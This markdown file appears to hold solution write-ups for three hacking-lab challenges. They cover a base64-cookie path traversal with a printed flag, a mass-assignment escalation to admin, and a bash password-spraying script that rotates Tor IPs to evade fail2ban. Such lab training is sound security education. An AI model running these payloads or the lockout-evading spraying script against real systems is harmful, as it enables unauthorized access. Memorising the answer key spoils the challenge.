# Simple Encoder - Solution

## Challenge Overview

**Goal**: Retrieve a secret flag by exploiting information disclosure + path traversal vulnerabilities.

**Endpoint**: `https://2c3c9fb5-4ba8-4f44-ac7a-9f66379102be.i.vuln.land/`

---

## Vulnerabilities Identified

| Vulnerability              | Description                                                       |
| -------------------------- | ----------------------------------------------------------------- |
| **Information Disclosure** | Cookie `user_details` exposes internal file path (base64-encoded) |
| **Path Traversal**         | No sanitization of `../` sequences allows reading arbitrary files |

---

## Attack Chain

### Step 1: Cookie Analysis

Inspecting the cookie using browser DevTools or curl:

```
Cookie Name:  user_details
Cookie Value: NGRucHIxOTU0Nmppby50eHQ%3D
```

Decoding:

```bash
# URL decode %3D → =
# Then base64 decode
echo "NGRucHIxOTU0Nmppby50eHQ=" | base64 -d
# Output: 4dnpr19546jio.txt
```

**Finding**: The cookie contains a filename that the server reads and displays.

### Step 2: Source Code Disclosure (Optional but useful)

Read the application source to understand the file structure:

```bash
# Encode path to index.php
echo -n '../../../opt/www/index.php' | base64
# Output: Li4vLi4vLi4vb3B0L3d3dy9pbmRleC5waHA=

# Fetch source code
curl -s -b "user_details=Li4vLi4vLi4vb3B0L3d3dy9pbmRleC5waHA=" \
  https://2c3c9fb5-4ba8-4f44-ac7a-9f66379102be.i.vuln.land/
```

**Finding**: Source reveals:

- Temp files stored in `/tmp/php/`
- Flag location: `/secret/flag.txt`

### Step 3: Flag Retrieval

From `/tmp/php/`, traverse to `/secret/flag.txt`:

```bash
# Encode the path traversal payload
echo -n '../../secret/flag.txt' | base64
# Output: Li4vLi4vc2VjcmV0L2ZsYWcudHh0

# Get the flag
curl -s -b "user_details=Li4vLi4vc2VjcmV0L2ZsYWcudHh0" \
  https://2c3c9fb5-4ba8-4f44-ac7a-9f66379102be.i.vuln.land/
```

---

## Flag

```
fceca90a-3c9a-4b98-8578-16da67370c8e
```

---

## Path Traversal Visualization

```
/tmp/php/randomfile.txt     ← Current location (from cookie)
    ↓ ../../
/secret/flag.txt            ← Target file
```

---

# SCHOGGI: API Mass Assignment - Solution

## Challenge Overview

**Goal**: Escalate a standard user (alice) to admin by exploiting a mass assignment vulnerability.

**Endpoint**: `https://af5ccccc-3597-4c65-a75c-86de8bd1ca9a.i.vuln.land/`

**Credentials**: `alice` / `alice.123`

---

## Vulnerability

| Vulnerability       | Description                                                                            |
| ------------------- | -------------------------------------------------------------------------------------- |
| **Mass Assignment** | API accepts more parameters than intended, allowing unauthorized property modification |

---

## Attack Chain

### Step 1: Login & Reconnaissance

1. Login as `alice` / `alice.123`
2. Open **Browser DevTools** (F12) → **Network** tab
3. Navigate to **PROFILE** page
4. Observe the `GET /api/account` request

**GET /api/account Response** - reveals user structure including `role` field:

```json
{
  "address": "Boulder Avenue 6",
  "credit_card": "2034 8857 0007 8024",
  "phone": "+41 760 603 132",
  "picture": "user101.png",
  "role": "user",           ← Target field
  "uid": 101,
  "username": "alice"
}
```

### Step 2: Analyze Profile Update Request

When editing profile (e.g., changing address), the app sends:

**POST /api/account**

```json
{ "address": "Boulder Avenue 7" }
```

The API blindly accepts and processes all JSON fields in the request body.

### Step 3: Parameter Injection (Mass Assignment Exploit)

Add `"role": "admin"` to the POST body:

**Malicious POST /api/account**

```json
{ "address": "Boulder Avenue 7", "role": "admin" }
```

**Methods to inject:**

- **Burp Suite**: Intercept → Modify → Forward
- **Browser DevTools**: Network → Edit and Resend
- **curl**: See below

### Step 4: Verify Privilege Escalation

1. Go back to the **Chocoshop homepage** (`/`)
2. You should now see the **ADMIN PAGE** instead of the regular shop

---

# Password Spraying HTTP - Solution

## Challenge Overview

**Goal**: Find the username (user_140000 - user_140500) that has a specific password using HTTP password spraying.

**Endpoint**: `http://pwspray.vm.vuln.land` (HTTP, not HTTPS!)

**Target Parameters**:

| Service | Port | Usernames                 | Password |
| ------- | ---- | ------------------------- | -------- |
| HTTP    | 80   | user_140000 - user_140500 | d906d458 |

**Defenses**:

- fail2ban: Blocks IP after ~3-5 failed attempts
- 10-minute lockout period
- Must rotate IP using Tor

---

## Vulnerability

| Vulnerability          | Description                                                 |
| ---------------------- | ----------------------------------------------------------- |
| **Weak Credentials**   | One user has a known/guessable password                     |
| **No Rate Limiting\*** | fail2ban only blocks by IP, bypassable with Tor IP rotation |

---

## Attack Concept

**Password Spraying** = Try ONE password against MANY users (opposite of brute force).

```
Traditional Brute Force:     Password Spraying:
user1 + password1           user1 + password_X
user1 + password2           user2 + password_X
user1 + password3           user3 + password_X
...                         ...
```

**Why it works**: Avoids per-user lockouts by spreading attempts across accounts.

---

## Attack Script

```bash
#!/bin/bash
# httpspray.sh - HTTP Password Spraying via Tor

PASSWORD=$1
if [ -z "$PASSWORD" ]; then
    echo "Usage: ./httpspray.sh <password>"
    exit 1
fi

# Resolve DNS before starting (avoids Tor DNS issues)
nslookup pwspray.vm.vuln.land > /dev/null 2>&1

# Restart Tor to get fresh IP
echo "[*] Starting Tor..."
sudo systemctl restart tor
sleep 3

attempt=0
user=140000

while [ $user -le 140500 ]; do
    candidate="user_$user:$PASSWORD"

    # Make request through Tor
    response=$(proxychains -q curl -s --max-time 10 --include \
        http://pwspray.vm.vuln.land -u "$candidate" 2>/dev/null)

    exit_code=$?

    # Handle timeout (exit code 28)
    if [ $exit_code -eq 28 ]; then
        echo "[!] Timeout on user_$user, retrying..."
        continue
    fi

    # Check for success
    if echo "$response" | grep -q "HTTP/1.1 200"; then
        echo ""
        echo "[+] SUCCESS! Found valid credentials:"
        echo "    Username: user_$user"
        echo "    Password: $PASSWORD"
        exit 0
    fi

    echo "[-] user_$user - failed"

    ((attempt++))
    ((user++))

    # Rotate IP every 10 attempts to avoid fail2ban
    if [ $((attempt % 10)) -eq 0 ]; then
        echo "[*] Rotating IP (restarting Tor)..."
        sudo systemctl restart tor
        sleep 3
    fi
done

echo "[!] No valid credentials found"
```

---

## Running the Attack

```bash
# 1. Make script executable
chmod +x httpspray.sh

# 2. Pre-resolve DNS (prevents Tor DNS issues)
nslookup pwspray.vm.vuln.land

# 3. Run the attack
./httpspray.sh d906d458
```

**Expected output**:

```
[*] Starting Tor...
[-] user_140000 - failed
[-] user_140001 - failed
...
[*] Rotating IP (restarting Tor)...
...
[+] SUCCESS! Found valid credentials:
    Username: user_140XXX
    Password: d906d458
```

---

## HTTP Basic Authentication Explained

Request format:

```
GET / HTTP/1.1
Host: pwspray.vm.vuln.land
Authorization: Basic dXNlcl8xNDAwMDA6ZDkwNmQ0NTg=
```

The `Authorization` header contains: `Basic base64(username:password)`

```bash
# Example encoding
echo -n 'user_140000:d906d458' | base64
# Output: dXNlcl8xNDAwMDA6ZDkwNmQ0NTg=
```

curl's `-u` flag handles this automatically.

---

## Response Codes

| Response                    | Meaning                |
| --------------------------- | ---------------------- |
| `HTTP/1.1 200 OK`           | Valid credentials      |
| `HTTP/1.1 401 Unauthorized` | Invalid credentials    |
| `HTTP/1.1 403 Forbidden`    | IP blocked by fail2ban |

---

## Key Commands

```bash
# Restart Tor (get new IP)
sudo systemctl restart tor

# Check current Tor exit IP
proxychains -q curl -s ifconfig.io

# Manual single test through Tor
proxychains -q curl -s --include http://pwspray.vm.vuln.land -u "user_140000:d906d458"

# Without Tor (will get blocked quickly)
curl -s --include http://pwspray.vm.vuln.land -u "user_140000:d906d458"
```

---

## Result

**Username/Password**: `user_140XXX` / `d906d458` _(run script to find exact user)_
